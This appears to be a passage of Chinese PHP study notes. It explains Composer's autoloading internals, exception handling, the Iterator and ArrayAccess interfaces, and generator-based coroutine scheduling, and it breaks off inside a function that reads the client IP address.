到这里，终于来到了核心的核心—— composer 自动加载的真相，命名空间如何通过 composer 转为对应目录文件的奥秘就在这一章。

前面说过，ClassLoader 的 register() 函数将 loadClass() 函数注册到 PHP 的 SPL 函数堆栈中， 每当 PHP 遇到不认识的命名空间时就会调用函数堆栈的每个函数，直到加载命名空间成功。所以 loadClass() 函数就是自动加载的关键了。

看下 loadClass() 函数:
```
public function loadClass($class)
{
    if ($file = $this->findFile($class)) {
        includeFile($file);

        return true;
    }
}

public function findFile($class)
{
    // work around for PHP 5.3.0 - 5.3.2 https://bugs.php.net/50731
    if ('\\' == $class[0]) {
        $class = substr($class, 1);
    }

    // class map lookup
    if (isset($this->classMap[$class])) {
        return $this->classMap[$class];
    }
    if ($this->classMapAuthoritative) {
        return false;
    }

    $file = $this->findFileWithExtension($class, '.php');

    // Search for Hack files if we are running on HHVM
    if ($file === null && defined('HHVM_VERSION')) {
        $file = $this->findFileWithExtension($class, '.hh');
    }

    if ($file === null) {
        // Remember that this class does not exist.
        return $this->classMap[$class] = false;
    }

    return $file;
}
```
我们看到 loadClass() ，主要调用 findFile() 函数。findFile() 在解析命名空间的时候主要分为两部分：

classMap 和 findFileWithExtension() 函数。classMap 很简单，直接看命名空间是否在映射数组中即可。

麻烦的是 findFileWithExtension() 函数，这个函数包含了 PSR0 和 PSR4 标准的实现。

还有个值得我们注意的是查找路径成功后 includeFile() 仍然是外面的函数， 并不是 ClassLoader 的成员函数，原理跟上面一样， 防止有用户写 $this 或 self。还有就是如果命名空间是以\开头的，要去掉\然后再匹配。

看下 findFileWithExtension 函数：
```
private function findFileWithExtension($class, $ext)
{
    // PSR-4 lookup
    $logicalPathPsr4 = strtr($class, '\\', DIRECTORY_SEPARATOR) . $ext;
    
    $first = $class[0];
    if (isset($this->prefixLengthsPsr4[$first])) {
        foreach ($this->prefixLengthsPsr4[$first] as $prefix => $length) {
            if (0 === strpos($class, $prefix)) {
                foreach ($this->prefixDirsPsr4[$prefix] as $dir) {
                    if (file_exists($file = $dir . DIRECTORY_SEPARATOR . substr($logicalPathPsr4, $length))) {
                        return $file;
                    }
                }
            }
        }
    }

    // PSR-4 fallback dirs
    foreach ($this->fallbackDirsPsr4 as $dir) {
        if (file_exists($file = $dir . DIRECTORY_SEPARATOR . $logicalPathPsr4)) {
            return $file;
        }
    }
    
    // PSR-0 lookup
    if (false !== $pos = strrpos($class, '\\')) {
        // namespaced class name
        $logicalPathPsr0 = substr($logicalPathPsr4, 0, $pos + 1)
            . strtr(substr($logicalPathPsr4, $pos + 1), '_', DIRECTORY_SEPARATOR);
    } else {
        // PEAR-like class name
        $logicalPathPsr0 = strtr($class, '_', DIRECTORY_SEPARATOR) . $ext;
    }
    
    if (isset($this->prefixesPsr0[$first])) {
        foreach ($this->prefixesPsr0[$first] as $prefix => $dirs) {
            if (0 === strpos($class, $prefix)) {
                foreach ($dirs as $dir) {
                    if (file_exists($file = $dir . DIRECTORY_SEPARATOR . $logicalPathPsr0)) {
                        return $file;
                    }
                }
            }
        }
    }
    
    // PSR-0 fallback dirs
    foreach ($this->fallbackDirsPsr0 as $dir) {
        if (file_exists($file = $dir . DIRECTORY_SEPARATOR . $logicalPathPsr0)) {
            return $file;
        }
    }
    
    // PSR-0 include paths.
    if ($this->useIncludePath && $file = stream_resolve_include_path($logicalPathPsr0)) {
        return $file;
    }
}
```
最后小结

我们通过举例来说下上面代码的流程：

如果我们在代码中写下 new phpDocumentor\Reflection\Element()，PHP 会通过 SPL_autoload_register 

调用 loadClass -> findFile -> findFileWithExtension。步骤如下：

将 \ 转为文件分隔符/，加上后缀php，变成 $logicalPathPsr4, 即 phpDocumentor/Reflection//Element.php;

利用命名空间第一个字母p作为前缀索引搜索 prefixLengthsPsr4 数组，查到下面这个数组：
```
        p' => 
            array (
                'phpDocumentor\\Reflection\\' => 25,
                'phpDocumentor\\Fake\\' => 19,
          )
```
遍历这个数组，得到两个顶层命名空间 phpDocumentor\Reflection\ 和 phpDocumentor\Fake\

在这个数组中查找 phpDocumentor\Reflection\Element，找出 phpDocumentor\Reflection\ 这个顶层命名空间并且长度为25。

在prefixDirsPsr4 映射数组中得到phpDocumentor\Reflection\ 的目录映射为：
```
    'phpDocumentor\\Reflection\\' => 
        array (
            0 => __DIR__ . '/..' . '/phpdocumentor/reflection-common/src',
            1 => __DIR__ . '/..' . '/phpdocumentor/type-resolver/src',
            2 => __DIR__ . '/..' . '/phpdocumentor/reflection-docblock/src',
        ),
```
遍历这个映射数组，得到三个目录映射；

查看 “目录+文件分隔符//+substr(&dollar;logicalPathPsr4, &dollar;length)”文件是否存在，存在即返回。这里就是 '__DIR__/../phpdocumentor/reflection-common/src + substr(phpDocumentor/Reflection/Element.php,25)' 如果失败，则利用 fallbackDirsPsr4 数组里面的目录继续判断是否存在文件 以上就是 composer 自动加载的原理解析！

### 异常处理
PHP 异常处理

异常用于在指定的错误发生时改变脚本的正常流程。

异常是什么

PHP 5 提供了一种新的面向对象的错误处理方法。

异常处理用于在指定的错误（异常）情况发生时改变脚本的正常流程。这种情况称为异常。

当异常被触发时，通常会发生：

当前代码状态被保存

代码执行被切换到预定义（自定义）的异常处理器函数

根据情况，处理器也许会从保存的代码状态重新开始执行代码，终止脚本执行，或从代码中另外的位置继续执行脚本

我们将展示不同的错误处理方法：

异常的基本使用

创建自定义的异常处理器

多个异常

重新抛出异常

设置顶层异常处理器

注释：异常应该仅仅在错误情况下使用，而不应该用于在一个指定的点跳转到代码的另一个位置。

异常的基本使用

当异常被抛出时，其后的代码不会继续执行，PHP 会尝试查找匹配的 "catch" 代码块。

如果异常没有被捕获，而且又没用使用 set_exception_handler() 作相应的处理的话， 那么将发生一个严重的错误（致命错误），并且输出 "Uncaught Exception" （未捕获异常）的错误消息。

让我们尝试抛出一个异常，同时不去捕获它：
```
<?php
// 创建一个有异常处理的函数
function checkNum($number)
{
    if($number>1)
    {
        throw new Exception("Value must be 1 or below");
    }
    return true;
}
 
// 触发异常
checkNum(2);
?>
```
上面的代码会得到类似这样的一个错误：
```
Fatal error: Uncaught exception 'Exception' with message 'Value must be 1 or below' 
in /www/runoob/test/test.php:7 Stack trace: #0 /www/runoob/test/test.php(13): 
checkNum(2) #1 {main} thrown in /www/runoob/test/test.php on line 7
Try、throw 和 catch
```
要避免上面实例中出现的错误，我们需要创建适当的代码来处理异常。

适当的处理异常代码应该包括：

Try - 使用异常的函数应该位于 "try" 代码块内。如果没有触发异常， 则代码将照常继续执行。但是如果异常被触发，会抛出一个异常。

Throw - 里规定如何触发异常。每一个 "throw" 必须对应至少一个 "catch"。

Catch - "catch" 代码块会捕获异常，并创建一个包含异常信息的对象。

让我们触发一个异常：
```
<?php
// 创建一个有异常处理的函数
function checkNum($number)
{
    if($number>1)
    {
        throw new Exception("变量值必须小于等于 1");
    }
        return true;
}
    
// 在 try 块 触发异常
try
{
    checkNum(2);
    // 如果抛出异常，以下文本不会输出
    echo '如果输出该内容，说明 $number 变量';
}
// 捕获异常
catch(Exception $e)
{
    echo 'Message: ' .$e->getMessage();
}
?>
```
上面代码将得到类似这样一个错误：

Message: 变量值必须小于等于 1

实例解释：

上面的代码抛出了一个异常，并捕获了它：

创建 checkNum() 函数。它检测数字是否大于 1。如果是，则抛出一个异常。

在 "try" 代码块中调用 checkNum() 函数。

checkNum() 函数中的异常被抛出。

"catch" 代码块接收到该异常，并创建一个包含异常信息的对象 ($e)。

通过从这个 exception 对象调用 $e->getMessage()，输出来自该异常的错误消息。

然而，为了遵循 "每个 throw 必须对应一个 catch" 的原则，可以设置一个顶层的异常处理器来处理漏掉的错误。

创建一个自定义的 Exception 类 创建自定义的异常处理程序非常简单。我们简单地创建了一个专门的类， 当 PHP 中发生异常时，可调用其函数。该类必须是 exception 类的一个扩展。

这个自定义的 customException 类继承了 PHP 的 exception 类的所有属性，您可向其添加自定义的函数。

我们开始创建 customException 类：
```
<?php
class customException extends Exception
{
    public function errorMessage()
    {
        // 错误信息
        $errorMsg = '错误行号 '.$this->getLine().' in '.$this->getFile()
        .': <b>'.$this->getMessage().'</b> 不是一个合法的 E-Mail 地址';
        return $errorMsg;
    }
}
 
$email = "someone@example...com";
 
try
{
    // 检测邮箱
    if(filter_var($email, FILTER_VALIDATE_EMAIL) === FALSE)
    {
        // 如果是个不合法的邮箱地址，抛出异常
        throw new customException($email);
    }
}
 
catch (customException $e)
{
//display custom message
echo $e->errorMessage();
}
?>
```
这个新的类是旧的 exception 类的副本，外加 errorMessage() 函数。正因为它是旧类的副本， 因此它从旧类继承了属性和方法，我们可以使用 exception 类的方法，比如 getLine()、getFile() 和 getMessage()。

实例解释：

上面的代码抛出了一个异常，并通过一个自定义的 exception 类来捕获它：

customException() 类是作为旧的 exception 类的一个扩展来创建的。这样它就继承了旧的 exception 类的所有属性和方法。

创建 errorMessage() 函数。如果 e-mail 地址不合法，则该函数返回一条错误消息。

把 $email 变量设置为不合法的 e-mail 地址字符串。

执行 "try" 代码块，由于 e-mail 地址不合法，因此抛出一个异常。

"catch" 代码块捕获异常，并显示错误消息。

多个异常

可以为一段脚本使用多个异常，来检测多种情况。

可以使用多个 if..else 代码块，或一个 switch 代码块，或者嵌套多个异常。

这些异常能够使用不同的 exception 类，并返回不同的错误消息：
```
<?php
class customException extends Exception
{
    public function errorMessage()
    {
        // 错误信息
        $errorMsg = '错误行号 '.$this->getLine().' in '.$this->getFile()
        .': <b>'.$this->getMessage().'</b> 不是一个合法的 E-Mail 地址';
        return $errorMsg;
    }
}
 
$email = "someone@example.com";
 
try
{
    // 检测邮箱
    if(filter_var($email, FILTER_VALIDATE_EMAIL) === FALSE)
    {
        // 如果是个不合法的邮箱地址，抛出异常
        throw new customException($email);
    }
    // 检测 "example" 是否在邮箱地址中
    if(strpos($email, "example") !== FALSE)
    {
        throw new Exception("$email 是 example 邮箱");
    }
}
catch (customException $e)
{
    echo $e->errorMessage();
}
catch(Exception $e)
{
    echo $e->getMessage();
}
?>
```
实例解释：

上面的代码测试了两种条件，如果其中任何一个条件不成立，则抛出一个异常：

customException() 类是作为旧的 exception 类的一个扩展来创建的。这样它就继承了旧的 exception 类的所有属性和方法。

创建 errorMessage() 函数。如果 e-mail 地址不合法，则该函数返回一个错误消息。

把 $email 变量设置为一个字符串，该字符串是一个有效的 e-mail 地址，但包含字符串 "example"。

执行 "try" 代码块，在第一个条件下，不会抛出异常。

由于 e-mail 含有字符串 "example"，第二个条件会触发异常。

"catch" 代码块会捕获异常，并显示恰当的错误消息。

如果 customException 类抛出了异常，但没有捕获 customException，仅仅捕获了 base exception，则在那里处理异常。

重新抛出异常

有时，当异常被抛出时，您也许希望以不同于标准的方式对它进行处理。可以在一个 "catch" 代码块中再次抛出异常。

脚本应该对用户隐藏系统错误。对程序员来说，系统错误也许很重要，但是用户对它们并不感兴趣。

为了让用户更容易使用，您可以再次抛出带有对用户比较友好的消息的异常：
```
<?php
class customException extends Exception
{
    public function errorMessage()
    {
        // 错误信息
        $errorMsg = $this->getMessage().' 不是一个合法的 E-Mail 地址。';
        return $errorMsg;
    }
}
 
$email = "someone@example.com";
 
try
{
    try
    {
        // 检测 "example" 是否在邮箱地址中
        if(strpos($email, "example") !== FALSE)
        {
            // 如果是个不合法的邮箱地址，抛出异常
            throw new Exception($email);
        }
    }
    catch(Exception $e)
    {
        // 重新抛出异常
        throw new customException($email);
    }
}
catch (customException $e)
{
    // 显示自定义信息
    echo $e->errorMessage();
}
?>
```
实例解释：

上面的代码检测在邮件地址中是否含有字符串 "example"。如果有，则再次抛出异常：

customException() 类是作为旧的 exception 类的一个扩展来创建的。这样它就继承了旧的 exception 类的所有属性和方法。

创建 errorMessage() 函数。如果 e-mail 地址不合法，则该函数返回一个错误消息。

把 $email 变量设置为一个字符串，该字符串是一个有效的 e-mail 地址，但包含字符串 "example"。

"try" 代码块包含另一个 "try" 代码块，这样就可以再次抛出异常。

由于 e-mail 包含字符串 "example"，因此触发异常。

"catch" 代码块捕获到该异常，并重新抛出 "customException"。

捕获到 "customException"，并显示一条错误消息。

如果在当前的 "try" 代码块中异常没有被捕获，则它将在更高层级上查找 catch 代码块。

设置顶层异常处理器

set_exception_handler() 函数可设置处理所有未捕获异常的用户定义函数。
```
<?php
function myException($exception)
{
    echo "<b>Exception:</b> " , $exception->getMessage();
}
 
set_exception_handler('myException');
 
throw new Exception('Uncaught Exception occurred');
?>
```
以上代码的输出如下所示：

Exception: Uncaught Exception occurred

在上面的代码中，不存在 "catch" 代码块，而是触发顶层的异常处理程序。应该使用此函数来捕获所有未被捕获的异常。

异常的规则

需要进行异常处理的代码应该放入 try 代码块内，以便捕获潜在的异常。

每个 try 或 throw 代码块必须至少拥有一个对应的 catch 代码块。

使用多个 catch 代码块可以捕获不同种类的异常。

可以在 try 代码块内的 catch 代码块中抛出（再次抛出）异常。

简而言之：如果抛出了异常，就必须捕获它。

### 如何 foreach 迭代对象
https://secure.php.net/manual/zh/class.iterator.php

Iterator（迭代器）接口 (No version information available, might only be in Git)

简介: 可在内部迭代自己的外部迭代器或类的接口。

接口摘要
```
Iterator extends Traversable {
/* 方法 */
abstract public current ( void ) : mixed
abstract public key ( void ) : scalar
abstract public next ( void ) : void
abstract public rewind ( void ) : void
abstract public valid ( void ) : bool
}
```
预定义迭代器

PHP 已经提供了一些用于日常任务的迭代器。 详细列表参见 SPL 迭代器。

范例

Example #1 基本用法

这个例子展示了使用 foreach 时，迭代器方法的调用顺序。
```
<?php
class myIterator implements Iterator {
    private $position = 0;
    private $array = array(
        "firstelement",
        "secondelement",
        "lastelement",
    );  

    public function __construct() {
        $this->position = 0;
    }

    function rewind() {
        var_dump(__METHOD__);
        $this->position = 0;
    }

    function current() {
        var_dump(__METHOD__);
        return $this->array[$this->position];
    }

    function key() {
        var_dump(__METHOD__);
        return $this->position;
    }

    function next() {
        var_dump(__METHOD__);
        ++$this->position;
    }

    function valid() {
        var_dump(__METHOD__);
        return isset($this->array[$this->position]);
    }
}

$it = new myIterator;

foreach($it as $key => $value) {
    var_dump($key, $value);
    echo "\n";
}
?>
以上例程的输出类似于：

string(18) "myIterator::rewind"
string(17) "myIterator::valid"
string(19) "myIterator::current"
string(15) "myIterator::key"
int(0)
string(12) "firstelement"

string(16) "myIterator::next"
string(17) "myIterator::valid"
string(19) "myIterator::current"
string(15) "myIterator::key"
int(1)
string(13) "secondelement"

string(16) "myIterator::next"
string(17) "myIterator::valid"
string(19) "myIterator::current"
string(15) "myIterator::key"
int(2)
string(11) "lastelement"

string(16) "myIterator::next"
string(17) "myIterator::valid"
Table of Contents
Iterator::current — 返回当前元素
Iterator::key — 返回当前元素的键
Iterator::next — 向前移动到下一个元素
Iterator::rewind — 返回到迭代器的第一个元素
Iterator::valid — 检查当前位置是否有效
```

### 如何数组化操作对象 `$obj[key];`

https://secure.php.net/manual/zh/class.arrayaccess.php

ArrayAccess（数组式访问）接口
(No version information available, might only be in Git)

简介
提供像访问数组一样访问对象的能力的接口。

接口摘要
```
ArrayAccess {
/* 方法 */
abstract public offsetExists ( mixed $offset ) : boolean
abstract public offsetGet ( mixed $offset ) : mixed
abstract public offsetSet ( mixed $offset , mixed $value ) : void
abstract public offsetUnset ( mixed $offset ) : void
}
```
Example #1 Basic usage

```
<?php
class obj implements arrayaccess {
    private $container = array();
    public function __construct() {
        $this->container = array(
            "one"   => 1,
            "two"   => 2,
            "three" => 3,
        );
    }
    public function offsetSet($offset, $value) {
        if (is_null($offset)) {
            $this->container[] = $value;
        } else {
            $this->container[$offset] = $value;
        }
    }
    public function offsetExists($offset) {
        return isset($this->container[$offset]);
    }
    public function offsetUnset($offset) {
        unset($this->container[$offset]);
    }
    public function offsetGet($offset) {
        return isset($this->container[$offset]) ? $this->container[$offset] : null;
    }
}

$obj = new obj;
var_dump(isset($obj["two"]));
var_dump($obj["two"]);
unset($obj["two"]);
var_dump(isset($obj["two"]));
$obj["two"] = "A value";
var_dump($obj["two"]);
$obj[] = 'Append 1';
$obj[] = 'Append 2';
$obj[] = 'Append 3';
print_r($obj);
?>
以上例程的输出类似于：

bool(true)
int(2)
bool(false)
string(7) "A value"
obj Object
(
    [container:obj:private] => Array
        (
            [one] => 1
            [three] => 3
            [two] => A value
            [0] => Append 1
            [1] => Append 2
            [2] => Append 3
        )

)
Table of Contents
ArrayAccess::offsetExists — 检查一个偏移位置是否存在
ArrayAccess::offsetGet — 获取一个偏移位置的值
ArrayAccess::offsetSet — 设置一个偏移位置的值
ArrayAccess::offsetUnset — 复位一个偏移位置的值
```

### yield 是什么，说个使用场景 yield
https://www.oschina.net/translate/cooperative-multitasking-using-coroutines-in-php

PHP5.5一个比较好的新功能是实现对生成器和协同程序的支持。对于生成器， PHP的文档和各种其他的博客文章（就像这一个或这一个）已经有了非常详细的讲解。

协同程序相对受到的关注就少了，所以协同程序虽然有很强大的功能但也很难被知晓，解释起来也比较困难。

这篇文章指导你通过使用协同程序来实施任务调度，通过实例实现对技术的理解。我将在前三节做一个简单的背景介绍。

如果你已经有了比较好的基础，可以直接跳到“协同多任务处理”一节。
 
生成器

生成器最基本的思想也是一个函数，这个函数的返回值是依次输出，而不是只返回一个单独的值。或者，换句话说， 生成器使你更方便的实现了迭代器接口。下面通过实现一个xrange函数来简单说明：
```
<?php
function xrange($start, $end, $step = 1) {
    for ($i = $start; $i <= $end; $i += $step) {
        yield $i;
    }
}
foreach (xrange(1, 1000000) as $num) {
    echo $num, "\n";
}

```
上面这个xrange（）函数提供了和PHP的内建函数range()一样的功能。但是不同的是range()函数返回的 是一个包含属组值从1到100万的数组（注：请查看手册）。而xrange（）函数返回的是依次输出这些值的一个迭代器， 而且并不会真正以数组形式计算。

这种方法的优点是显而易见的。它可以让你在处理大数据集合的时候不用一次性的加载到内存中。

甚至你可以处理无限大的数据流。

当然，也可以不同通过生成器来实现这个功能，而是可以通过继承Iterator接口实现。

通过使用生成器实现起来会更方便，而不用再去实现iterator接口中的5个方法了。

生成器为可中断的函数

要从生成器认识协同程序，理解它们内部是如何工作的非常重要：生成器是可中断的函数，在它里面，yield构成了中断点。 

紧接着上面的例子，如果你调用xrange(1,1000000)的话，xrange()函数里代码没有真正地运行。

相反，PHP只是返回了一个实现了迭代器接口的 生成器类实例： 
```
<?php
$range = xrange(1, 1000000);
var_dump($range); // object(Generator)#1
var_dump($range instanceof Iterator); // bool(true)
```

你对某个对象调用迭代器方法一次，其中的代码运行一次。例如，如果你调用`$range->rewind()`, 那么`xrange()`里的代码运行到控制流 第一次出现`yield`的地方。在这种情况下， 这就意味着当`$i=$start`时`yield $i`才运行。传递给`yield`语句的值是使用`$range->current()`获取的。
 
为了继续执行生成器中的代码，你必须调用$range->next()方法。这将再次启动生成器，直到yield语句出现。

因此，连续调用next()和current()方法 你将能从生成器里获得所有的值，直到某个点没有再出现yield语句。

对xrange()来说，这种情形出现在$i超过$end时。在这中情况下， 控制流将到达函数的终点，因此将不执行任何代码。

一旦这种情况发生，vaild()方法将返回假，这时迭代结束。
 
协程

协程给上面功能添加的主要东西是回送数据给生成器的能力。这将把生成器到调用者的单向通信转变为两者之间的双向通信。

通过调用生成器的send()方法而不是其next()方法传递数据给协程。下面的logger()协程是这种通信如何运行的例子：
```
<?php
function logger($fileName) {
    $fileHandle = fopen($fileName, 'a');
    while (true) {
        fwrite($fileHandle, yield . "\n");
    }
}

$logger = logger(__DIR__ . '/log');
$logger->send('Foo');
$logger->send('Bar')
```
正如你能看到，这儿yield没有作为一个语句来使用，而是用作一个表达式。即它有一个返回值。

yield的返回值是传递给send()方法的值。 在这个例子里，yield将首先返回"Foo",然后返回"Bar"。

上面的例子里yield仅作为接收者。混合两种用法是可能的，即既可接收也可发送。接收和发送通信如何进行的例子如下：
```
<?php
function gen() {
    $ret = (yield 'yield1');
    var_dump($ret);
    $ret = (yield 'yield2');
    var_dump($ret);
}
$gen = gen();
var_dump($gen->current());    // string(6) "yield1"
var_dump($gen->send('ret1')); // string(4) "ret1"   (the first var_dump in gen)
                              // string(6) "yield2" (the var_dump of the ->send() return value)
var_dump($gen->send('ret2')); // string(4) "ret2"   (again from within gen)
                              // NULL               (the return value of ->send())
```
马上理解输出的精确顺序有点困难，因此确定你知道为什按照这种方式输出。我愿意特别指出的有两点：

第一点，yield表达式两边使用 圆括号不是偶然。由于技术原因（虽然我已经考虑为赋值增加一个异常，就像Python那样），圆括号是必须的。

第二点，你可能已经注意到 调用current()之前没有调用rewind()。如果是这么做的，那么已经隐含地执行了rewind操作。
 
多任务协作

如果阅读了上面的logger()例子，那么你认为“为了双向通信我为什么要使用协程呢？ 为什么我不能只用常见的类呢？”，

你这么问完全正确。上面的例子演示了基本用法，然而上下文中没有真正的展示出使用协程的优点。

这就是列举许多协程例子的理由。正如上面介绍里提到的，协程是非常强大的概念， 不过这样的应用很稀少而且常常十分复杂。给出一些简单而真实的例子很难。

在这篇文章里，我决定去做的是使用协程实现多任务协作。我们尽力解决的问题是你想并发地运行多任务(或者“程序”）。

不过处理器在一个时刻只能运行一个任务（这篇文章的目标是不考虑多核的）。

因此处理器需要在不同的任务之间进行切换，而且总是让每个任务运行 “一小会儿”。
 
多任务协作这个术语中的“协作”说明了如何进行这种切换的：它要求当前正在运行的任务自动把控制传回给调度器， 这样它就可以运行其他任务了。这与“抢占”多任务相反，抢占多任务是这样的：调度器可以中断运行了一段时间的任务， 不管它喜欢还是不喜欢。协作多任务在Windows的早期版本（windows95)和Mac OS中有使用，不过它们后来都切换到使用抢先多任务了。

理由相当明确：如果你依靠程序自动传回 控制的话，那么坏行为的软件将很容易为自身占用整个CPU，不与其他任务共享。 

这个时候你应当明白协程和任务调度之间的联系：yield指令提供了任务中断自身的一种方法，然后把控制传递给调度器。

因此协程可以运行多个其他任务。更进一步来说，yield可以用来在任务和调度器之间进行通信。

我们的目的是 对 “任务”用更轻量级的包装的协程函数:
```
<?php
class Task {
    protected $taskId;
    protected $coroutine;
    protected $sendValue = null;
    protected $beforeFirstYield = true;
    public function __construct($taskId, Generator $coroutine) {
        $this->taskId = $taskId;
        $this->coroutine = $coroutine;
    }
    public function getTaskId() {
        return $this->taskId;
    }
    public function setSendValue($sendValue) {
        $this->sendValue = $sendValue;
    }
    public function run() {
        if ($this->beforeFirstYield) {
            $this->beforeFirstYield = false;
            return $this->coroutine->current();
        } else {
            $retval = $this->coroutine->send($this->sendValue);
            $this->sendValue = null;
            return $retval;
        }
    }
    public function isFinished() {
        return !$this->coroutine->valid();
    }
}

```
一个任务是用 任务ID标记一个协程。使用setSendValue()方法，你可以指定哪些值将被发送到下次的恢复（在之后你会了解到我们需要这个）。 

run()函数确实没有做什么，除了调用send()方法的协同程序。要理解为什么添加beforeFirstYieldflag，需要考虑下面的代码片段：

```
<?php
function gen() {
    yield 'foo';
    yield 'bar';
}
$gen = gen();
var_dump($gen->send('something'));
// As the send() happens before the first yield there is an implicit rewind() call,
// so what really happens is this:
$gen->rewind();
var_dump($gen->send('something'));
// The rewind() will advance to the first yield (and ignore its value), the send() will
// advance to the second yield (and dump its value). Thus we loose the first yielded value!
```
通过添加 beforeFirstYieldcondition 我们可以确定 first yield 的值 被返回。
 
调度器现在不得不比多任务循环要做稍微多点了，然后才运行多任务：

```
<?php
class Scheduler {
    protected $maxTaskId = 0;
    protected $taskMap = []; // taskId => task
    protected $taskQueue;
    public function __construct() {
        $this->taskQueue = new SplQueue();
    }
    public function newTask(Generator $coroutine) {
        $tid = ++$this->maxTaskId;
        $task = new Task($tid, $coroutine);
        $this->taskMap[$tid] = $task;
        $this->schedule($task);
        return $tid;
    }
    public function schedule(Task $task) {
        $this->taskQueue->enqueue($task);
    }
    public function run() {
        while (!$this->taskQueue->isEmpty()) {
            $task = $this->taskQueue->dequeue();
            $task->run();
            if ($task->isFinished()) {
                unset($this->taskMap[$task->getTaskId()]);
            } else {
                $this->schedule($task);
            }
        }
    }
}
```

newTask()方法（使用下一个空闲的任务id）创建一个新任务，然后把这个任务放入任务映射数组里。

接着它通过把任务放入任务队列里来实现对任务的调度。接着run()方法扫描任务队列，运行任务。

如果一个任务结束了，那么它将从队列里删除，否则它将在队列的末尾再次被调度。

让我们看看下面具有两个简单（并且没有什么意义）任务的调度器： 

```
<?php
function task1() {
    for ($i = 1; $i <= 10; ++$i) {
        echo "This is task 1 iteration $i.\n";
        yield;
    }
}
function task2() {
    for ($i = 1; $i <= 5; ++$i) {
        echo "This is task 2 iteration $i.\n";
        yield;
    }
}
$scheduler = new Scheduler;
$scheduler->newTask(task1());
$scheduler->newTask(task2());
$scheduler->run();
两个任务都仅仅回显一条信息，然后使用yield把控制回传给调度器。输出结果如下：
This is task 1 iteration 1.
This is task 2 iteration 1.
This is task 1 iteration 2.
This is task 2 iteration 2.
This is task 1 iteration 3.
This is task 2 iteration 3.
This is task 1 iteration 4.
This is task 2 iteration 4.
This is task 1 iteration 5.
This is task 2 iteration 5.
This is task 1 iteration 6.
This is task 1 iteration 7.
This is task 1 iteration 8.
This is task 1 iteration 9.
This is task 1 iteration 10.
```

输出确实如我们所期望的：对前五个迭代来说，两个任务是交替运行的，接着第二个任务结束后，只有第一个任务继续运行。
 
与调度器之间通信

既然调度器已经运行了，那么我们就转向日程表的下一项：任务和调度器之间的通信。

我们将使用进程用来和操作系统会话的同样的方式来通信：系统调用。我们需要系统调用的理由是操作系统与进程相比它处在不同的权限级别上。

因此为了执行特权级别的操作（如杀死另一个进程），就不得不以某种方式把控制传回给内核，这样内核就可以执行所说的操作了。

再说一遍，这种行为在内部是通过使用中断指令来实现的。过去使用的是通用的int指令，如今使用的是更特殊并且更快速的syscall/sysenter指令。

我们的任务调度系统将反映这种设计：不是简单地把调度器传递给任务（这样久允许它做它想做的任何事），

我们将通过给yield表达式传递信息来与系统调用通信。这儿yield即是中断，也是传递信息给调度器（和从调度器传递出信息）的方法。

为了说明系统调用，我将对可调用的系统调用做一个小小的封装：
```
<?php
class SystemCall {
    protected $callback;
    public function __construct(callable $callback) {
        $this->callback = $callback;
    }
    public function __invoke(Task $task, Scheduler $scheduler) {
        $callback = $this->callback; // Can't call it directly in PHP :/
        return $callback($task, $scheduler);
    }
}
```

它将像其他任何可调用那样(使用_invoke)运行，不过它要求调度器把正在调用的任务和自身传递给这个函数。

为了解决这个问题 我们不得不微微的修改调度器的run方法：

```
<?php
public function run() {
    while (!$this->taskQueue->isEmpty()) {
        $task = $this->taskQueue->dequeue();
        $retval = $task->run();
        if ($retval instanceof SystemCall) {
            $retval($task, $this);
            continue;
        }
        if ($task->isFinished()) {
            unset($this->taskMap[$task->getTaskId()]);
        } else {
            $this->schedule($task);
        }
    }
}
```

第一个系统调用除了返回任务ID外什么都没有做：

```
<?php
function getTaskId() {
    return new SystemCall(function(Task $task, Scheduler $scheduler) {
        $task->setSendValue($task->getTaskId());
        $scheduler->schedule($task);
    });
}
```

这个函数确实设置任务id为下一次发送的值，并再次调度了这个任务。由于使用了系统调用，所以调度器不能自动调用任务， 我们需要手工调度任务（稍后你将明白为什么这么做）。要使用这个新的系统调用的话，我们要重新编写以前的例子：

```
<?php
function task($max) {
    $tid = (yield getTaskId()); // <-- here's the syscall!
    for ($i = 1; $i <= $max; ++$i) {
        echo "This is task $tid iteration $i.\n";
        yield;
    }
}
$scheduler = new Scheduler;
$scheduler->newTask(task(10));
$scheduler->newTask(task(5));
$scheduler->run();
```

这段代码将给出与前一个例子相同的输出。注意系统调用同其他任何调用一样正常地运行， 不过预先增加了yield。要创建新的任务，然后再杀死它们的话，需要两个以上的系统调用：  

```
<?php
function newTask(Generator $coroutine) {
    return new SystemCall(
        function(Task $task, Scheduler $scheduler) use ($coroutine) {
            $task->setSendValue($scheduler->newTask($coroutine));
            $scheduler->schedule($task);
        }
    );
}
function killTask($tid) {
    return new SystemCall(
        function(Task $task, Scheduler $scheduler) use ($tid) {
            $task->setSendValue($scheduler->killTask($tid));
            $scheduler->schedule($task);
        }
    );
}
```

killTask函数需要在调度器里增加一个方法：

```
<?php
public function killTask($tid) {
    if (!isset($this->taskMap[$tid])) {
        return false;
    }
    unset($this->taskMap[$tid]);
    // This is a bit ugly and could be optimized so it does not have to walk the queue,
    // but assuming that killing tasks is rather rare I won't bother with it now
    foreach ($this->taskQueue as $i => $task) {
        if ($task->getTaskId() === $tid) {
            unset($this->taskQueue[$i]);
            break;
        }
    }
    return true;
}
```

用来测试新功能的微脚本：  

```
<?php
function childTask() {
    $tid = (yield getTaskId());
    while (true) {
        echo "Child task $tid still alive!\n";
        yield;
    }
}
function task() {
    $tid = (yield getTaskId());
    $childTid = (yield newTask(childTask()));
    for ($i = 1; $i <= 6; ++$i) {
        echo "Parent task $tid iteration $i.\n";
        yield;
        if ($i == 3) yield killTask($childTid);
    }
}

$scheduler = new Scheduler;
$scheduler->newTask(task());
$scheduler->run();
 这段代码将打印以下信息：
Parent task 1 iteration 1.
Child task 2 still alive!
Parent task 1 iteration 2.
Child task 2 still alive!
Parent task 1 iteration 3.
Child task 2 still alive!
Parent task 1 iteration 4.
Parent task 1 iteration 5.
Parent task 1 iteration 6.
https://www.cnblogs.com/lynxcat/p/7954456.html
```

### 如何获取客户端 IP 和服务端 IP 地址
客户端 IP    

https://stackoverflow.com/questions/3003145/how-to-get-the-client-ip-address-in-php

这是获取IP地址的更短，更简洁的方法：
```
function get_ip_address(){
    foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $key){
        if (array_key_exists($key, $_SERVER) === true){
            foreach (explode(',', $_SERVER[$key]) as $ip){
                $ip = trim($ip); // just to be safe
